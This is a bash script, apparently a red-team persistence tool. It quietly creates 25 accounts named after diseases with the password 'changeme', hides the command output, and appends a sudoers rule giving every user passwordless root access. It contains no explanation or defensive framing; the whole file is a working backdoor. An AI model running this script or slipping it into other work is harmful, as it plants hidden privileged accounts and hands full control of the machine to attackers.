#!/bin/bash

num=$(($RANDOM%13));
viruses=("BlackPlague" "Cholera" "Covid" "Ebola" "Leprosy" "Malaria" "SARS" "SmallPox" "SpanishFlu" "SwineFlu" "TB" "YellowFever");
virus=${viruses[num]};
let END=25 i=1
letter=("A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M" "N" "O" "P" "Q" "R" "S" "T" "U" "V" "W" "X" "Y" "Z")
while((i<=END)); do
    alpha=${letter[i]};
    user="$virus$alpha"
    let i++
#done
# Add all the following users add wheel/sudo with a password changem
#for user in "${package[@]}"
#do
    adduser  --disabled-password --gecos "" --force-badname "$user"  2>&1 >/dev/null;
    echo "$user:changeme" | chpasswd 2>/dev/null >/dev/null;
    echo sudo usermod -aG sudo "$user" #2>/dev/null >/dev/nul;
done

echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> "/etc/sudoers";
